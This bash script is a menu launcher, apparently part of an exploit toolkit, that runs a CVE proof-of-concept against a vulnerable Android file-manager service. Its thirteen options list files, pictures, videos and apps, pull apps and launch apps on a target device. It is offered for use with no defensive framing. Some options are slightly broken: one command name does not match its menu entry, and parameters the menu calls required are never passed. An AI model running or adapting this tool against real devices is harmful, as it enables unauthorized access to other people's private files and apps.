#!/bin/bash
RED="\033[31m"
GREEN="\033[32m"
BLUE="\033[34m"
RESET="\033[0m"
BASH=/bin/bash
PYTHON3=/usr/bin/python3
echo -e "$RED
EEEEEEEEEE     SSSSSSSS
EE        EE  SS   
EE        EE  SS
EEEEEEEEEE     SSSSSSSS
EE                   SS
EE        EE         SS
EEEEEEEEEEEE  SSSSSSSS 
BY:Snow wolf
$RESET"
echo -e "[$BLUE 1.listFiles: List all the files $RESET]"
echo -e "[$BLUE 2.listPics: List all the pictures$RESET]"
echo -e "[$BLUE 3.listVideos: List all the videos$RESET]"
echo -e "[$BLUE 4.listAudios: List all the audio files$RESET]"
echo -e "[$BLUE 5.listApps: List all the apps installed$RESET]"
echo -e "[$BLUE 6.listAppsSystem: List all the system apps$RESET]"
echo -e "[$BLUE 7.listAppsPhone: List all the phone apps$RESET]"
echo -e "[$BLUE 8.listAppsSdcard: List all the apk files in the sdcard$RESET]"
echo -e "[$BLUE 9.listAppsAll: List all the apps installed (system apps included)$RESET]"
echo -e "[$BLUE 10.getDeviceInfo: Get device info. Package name parameter is needed$RESET]"
echo -e "[$BLUE 11.appPull: Pull an app from the device$RESET]"
echo -e "[$BLUE 12.appLaunch: Launch an app. Package name parameter is needed$RESET]"
echo -e "[$BLUE 13.getAppThumbnail: Get the icon of an app. Package name parameter is needed$RESET]"
echo -e "[$RED q/Q return $RESET]"
read -p 'Snowwolf:' ESEXP
case $ESEXP in
1)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd listFiles
  ;;
2)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd listPics
  ;;
3)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd listVideos
  ;;
4)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd listAudios
  ;;
5)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd listApps
  ;;
6)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd listAppsSystem
  ;;
7)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd listAppsPhone
  ;;
8)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd listAppSdcard
  ;;
9)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd listAppsAll
  ;;
10)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd getDeviceInfo
  ;;
11)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd appPull
  ;;
12)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd appLaunch
  ;;
13)echo
  $PYTHON3 web/cve/esexp/poc.py --cmd getAppThumbnail
  ;;
q)echo
  $BASH cve-exploit.sh
  ;;
esac
